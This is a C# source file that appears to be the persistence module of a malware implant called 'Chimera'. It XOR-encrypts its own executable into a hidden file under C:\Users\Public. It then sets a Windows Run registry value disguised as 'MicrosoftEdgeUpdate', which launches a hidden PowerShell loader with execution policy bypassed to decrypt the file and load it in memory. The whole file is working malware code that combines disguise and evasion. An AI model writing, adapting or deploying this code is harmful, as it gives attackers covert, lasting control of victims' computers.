using System;
using System.IO;
using Microsoft.Win32;

namespace Chimera.Commands
{
    public static class Persist
    {
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private const string BlobPath = @"C:\Users\Public\agent.dat";
        private static readonly byte XorKey = 0x41;

        public static string Execute()
        {
            try
            {
                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                byte[] raw = File.ReadAllBytes(selfPath);

                byte[] encrypted = new byte[raw.Length];
                for (int i = 0; i < raw.Length; i++)
                    encrypted[i] = (byte)(raw[i] ^ XorKey);

                File.WriteAllBytes(BlobPath, encrypted);
                File.SetAttributes(BlobPath, File.GetAttributes(BlobPath) | FileAttributes.Hidden);

                // Correctly escaped PowerShell loader
                string loader = @"powershell -ep bypass -Window Hidden -c ""$k=0x41;$d=[IO.File]::ReadAllBytes('" + BlobPath + @"');$o=$d|%{$_ -bxor $k};[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())""";

                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null) return "[error] Could not open HKCU Run key.";
                    key.SetValue(RegValue, loader, RegistryValueKind.String);
                }

                return $"[+] Fileless persistence set.\n    Blob: {BlobPath}\n    Reg: HKCU\\{RegKey}\\{RegValue}";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        // Remove method unchanged...
    }
}
